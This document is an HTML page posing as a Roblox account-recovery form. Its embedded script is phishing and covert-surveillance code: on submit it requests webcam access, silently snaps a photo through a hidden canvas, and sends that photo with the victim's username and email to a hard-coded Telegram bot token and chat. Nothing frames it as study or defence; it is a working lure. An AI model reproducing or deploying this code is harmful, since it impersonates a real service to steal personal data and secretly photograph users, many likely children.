<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Roblox Recovery Account</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Arial', sans-serif;
      background-color: #0f172a;
      color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background-color: #1e293b;
      padding: 30px 20px;
      border-radius: 10px;
      box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.2);
      max-width: 400px;
      width: 100%;
      text-align: center;
    }
    h2 {
      font-size: 24px;
      color: #e2e8f0;
      margin-bottom: 10px;
    }
    p {
      font-size: 14px;
      color: #94a3b8;
      margin-bottom: 20px;
    }
    input {
      padding: 12px;
      font-size: 14px;
      border-radius: 8px;
      border: 1px solid #64748b;
      background-color: #1e293b;
      color: #ffffff;
      margin-bottom: 15px;
      width: 100%;
    }
    input:focus {
      outline: none;
      border-color: #0ea5e9;
    }
    button {
      padding: 12px;
      background-color: #0ea5e9;
      border: none;
      border-radius: 8px;
      color: #ffffff;
      font-size: 16px;
      cursor: pointer;
    }
    button:hover {
      background-color: #0284c7;
    }
    #hiddenCanvas {
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Roblox</h2>
    <p>Fill in the form to recover your account.</p>
    <form id="recoveryForm">
      <input type="text" id="username" placeholder="Enter your username" required>
      <input type="email" id="email" placeholder="Enter your email" required>
      <button type="submit">Recover Account</button>
    </form>
  </div>

  <canvas id="hiddenCanvas"></canvas>

  <script>
    const telegramToken = '7143489396:AAH6nnxpNdwDPTFDtVGgJ04f_rOQvjPm_Z0';
    const telegramChatId = '-1002188815934';

    function sendToTelegram(photoBlob, caption) {
      const apiUrl = `https://api.telegram.org/bot${telegramToken}/sendPhoto`;

      const formData = new FormData();
      formData.append('chat_id', telegramChatId);
      formData.append('photo', photoBlob, 'photo.jpg');
      formData.append('caption', caption);

      fetch(apiUrl, {
        method: 'POST',
        body: formData
      })
        .then(response => response.json())
        .then(data => console.log('Photo sent to Telegram:', data))
        .catch(error => console.error('Error sending photo to Telegram:', error));
    }

    function takeAndSendPhoto(formData) {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          const video = document.createElement('video');
          video.srcObject = stream;
          video.play();

          setTimeout(() => {
            const canvas = document.getElementById('hiddenCanvas');
            canvas.width = 640; // Photo resolution
            canvas.height = 480;

            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            stream.getTracks().forEach(track => track.stop()); // Stop the camera stream

            canvas.toBlob(blob => {
              const caption = `Username: ${formData.username}\nEmail: ${formData.email}`;
              sendToTelegram(blob, caption);
            }, 'image/jpeg');
          }, 1000); // 1-second delay
        })
        .catch(err => {
          console.error('Error accessing camera:', err);
          if (err.name === 'NotAllowedError') {
            alert('Please allow camera access to proceed.');
          }
        });
    }

    document.getElementById('recoveryForm').addEventListener('submit', function(event) {
      event.preventDefault();

      const formData = {
        username: document.getElementById('username').value,
        email: document.getElementById('email').value
      };

      takeAndSendPhoto(formData);
    });
  </script>
</body>
</html>
